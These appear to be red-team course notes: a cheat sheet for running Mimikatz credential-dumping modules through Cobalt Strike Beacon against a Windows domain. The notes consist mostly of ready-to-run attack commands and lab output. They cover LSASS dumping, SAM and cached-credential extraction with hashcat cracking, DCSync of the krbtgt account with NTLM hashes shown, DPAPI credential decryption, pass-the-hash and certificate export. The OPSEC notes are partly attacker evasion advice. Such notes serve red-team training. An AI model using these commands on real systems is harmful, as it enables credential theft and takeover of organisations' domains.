The `!` elevates Beacon to SYSTEM before running the given command, which is useful in cases where you're running in high-integrity but need to impersonate SYSTEM.  In most cases, `!` is a direct replacement for `token::elevate`. For example:

```
beacon> mimikatz !lsadump::sam
```

The `@` impersonates Beacon's thread token before running the given command, which is useful in cases where Mimikatz needs to interact with a remote system, such as with dcsync.  This is also compatible with other impersonation primitives such as `make_token` and `steal_token`.  For example:

```
beacon> getuid
[*] You are DEV\bfarmer

beacon> make_token DEV\nlamb F3rrari
[+] Impersonated DEV\nlamb (netonly)

beacon> mimikatz @lsadump::dcsync /user:DEV\krbtgt
[DC] 'dev.cyberbotic.io' will be the domain
[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
[DC] 'DEV\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 8/15/2022 4:01:04 PM
Object Security ID   : S-1-5-21-569305411-121244042-2357301523-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 9fb924c244ad44e934c390dc17e02c3d
    ntlm- 0: 9fb924c244ad44e934c390dc17e02c3d
    lm  - 0: 207d5e08551c51892309c0cf652c353b
```


## logonpasswords

---

This module is still capable of retrieving NTLM hashes which is useful for pairing with the **Pass the Hash** or even cracking to recover the plaintext.

```
mimikatz !sekurlsa::logonpasswords
```

  **OPSEC**  
  
This module will open a read handle to LSASS which can be logged under event 4656.


## ekeys

---

The `sekurlsa::ekeys` Mimikatz module will dump the Kerberos encryption keys of currently logged on users.

Since most modern Windows services choose to use Kerberos over NTLM, leveraging these instead of NTLM hashes makes more sense for blending into normal authentication traffic.

These keys can be used in a variety of Kerberos abuse scenarios.

```
mimikatz !sekurlsa::ekeys
```

  **OPSEC**  
  
This module also opens a read handle to LSASS.


## sam

---

The Security Account Manager (SAM) database holds the NTLM hashes of local accounts only.

```
mimikatz !lsadump::sam
```

**OPSEC**  
  
This module will open a handle to the SAM registry hive.


## cache

---

Domain Cached Credentials (DCC) was designed for instances where domain credentials are required to logon to a machine, even whilst it's disconnected from the domain (think of a roaming laptop for example).  The local device caches the domain credentials so authentication can happen locally, but these can be extracted and cracked offline to recover plaintext credentials.

Unfortunately, the hash format is not NTLM so it can't be used with pass the hash.  The only viable use for these is to crack them offline.

The `lsadump::cache` Mimikatz module can extract these from `HKLM\SECURITY`.

```
mimikatz !lsadump::cache
```

For hashcat the hashes should look like this:
```
$DCC2$10240#username#hash
```

```
hashcat -a 0 -m 2100
```

**OPSEC**  
  
This module will open a handle to the SECURITY registry hive.


## dcsync

---

The [Directory Replication Service (MS-DRSR) protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47) is used to synchronise and replicate Active Directory data between domain controllers.  DCSync is a technique which leverages this protocol to extract username and credential data from a DC.

```
mimikatz lsadump::dcsync
```

In beacon:

```
dcsync dev.cyberbotic.io DEV\krbtgt
```

**OPSEC**  
  
Directory replication can be detected if Directory Service Access auditing is enabled, by searching for 4662 events where the identifying GUID is `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (for DS-Replication-Get-Changes and DS-Replication-Get-Changes-All) or `89e95b76-444d-4c62-991a-0facbeda640c` (DS-Replication-Get-Changes-In-Filtered-Set).

### For Domain and GUID

Performs a DSync attack for a specified domain and GUID.

```
mimikatz @lsadump::dcsync /domain:cyberbotic.io /guid:{b93d2e36-48df-46bf-89d5-2fc22c139b43}
```


## dpapi

---

### Elevated

DPAPI is used by the Windows Credential Manager to store saved secrets such as RDP credentials, and by third-party applications like Google Chrome to store website credentials.

```
mimikatz !sekurlsa::dpapi
```

### Not Elevated

DPAPI is used by the Windows Credential Manager to store saved secrets such as RDP credentials, and by third-party applications like Google Chrome to store website credentials.

```
mimikatz dpapi::masterkey /in:C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104\bfc5090d-22fe-4058-8953-47f6882f549e /rpc
```


## cred (decrypt)

---

Decrypts WCM blob.

```
mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\6C33AC85D0C4DCEAB186B3B2E5B1AC7C /masterkey:8d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214
```


## cred (get MasterKey)

---

Returns the GUID of the WCM blob's MasterKey.

```
mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E
```


## Enable Authentication Over Proxy

---

Enables authentication over proxy.

```
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /domain:DEV /user:bfarmer /ntlm:4ea24377a53e67e78b2bd853974420fc /run:mmc.exe
```


## certificates

---

### User Certificates

Exports the current user's ADCS certificates.

```
mimikatz crypto::certificates /export
```

### Computer Certificates

Exports the machine's ADCS certificates.

```
mimikatz !crypto::certificates /systemstore:local_machine /export
```


## trust

---

Dumps the domain trust hashes.

```
mimikatz lsadump::trust /patch
```

